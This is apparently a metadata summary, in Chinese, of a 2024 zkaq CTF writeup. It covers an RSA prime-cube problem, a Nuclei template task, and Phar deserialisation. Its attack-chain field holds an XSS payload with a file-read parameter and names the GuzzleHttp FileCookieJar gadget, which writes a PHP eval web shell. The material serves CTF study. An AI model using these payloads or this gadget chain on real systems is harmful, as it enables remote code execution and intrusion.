---
title: 掌控安全CTF挑战赛 Writeup by Mini-Venom (ChaMd5)
contest: 掌控安全CTF挑战赛(zkaq)
year: 2024
difficulty: medium
vuln_type: misc_unknown
tags: [zkaq, Nuclei模板, 自定义YAML, 模板注入, GuzzleHttp\Cookie\FileCookieJar, Phar反序列化, 掌控安全, Mini-Venom, ChaMd5, 招新, p^3, RSA多素数]
attack_chain: 密码1:RSA p^3单素数三次幂:phi=p^3*(p-1) → inverse(e,phi)解 → flag → 模板题:写Nuclei 0day模板:http请求/api/v1/version取version与/api/v2/echo/?name=<script>alert(1111)</script>&file=/etc/p0sswd_95271834触发XSS+文件读取 → 返回zkaq{a}+<script> → 触发条件得flag → Phar反序列化:CookieJar+FileCookieJar+SetCookie+Expires='<?php eval($_POST[0]);?>'生成shell.phar → Python http.server自托管 → upload触发
key_payload: RSA p^3 phi=p^3*(p-1) + Nuclei 0day模板 + GuzzleHttp\Cookie\FileCookieJar Phar
one_liner: 掌控安全CTF zkaq题 Mini-Venom:密码RSA p^3+web Nuclei模板注入+Phar反序列化GuzzleHttp。
lesson: 密码:RSA单素数p^k次幂phi=p^k*(p-1);Web:zkaq类题经典Nuclei 0day模板自定义YAML触发;反序列化:GuzzleHttp\Cookie\FileCookieJar+SetCookie+Expires链是GuzzleHttp Phar反序列化经典Gadget;ZKAQ赛事常见"非常安全，没有问题"判断逻辑。
quality: medium
---
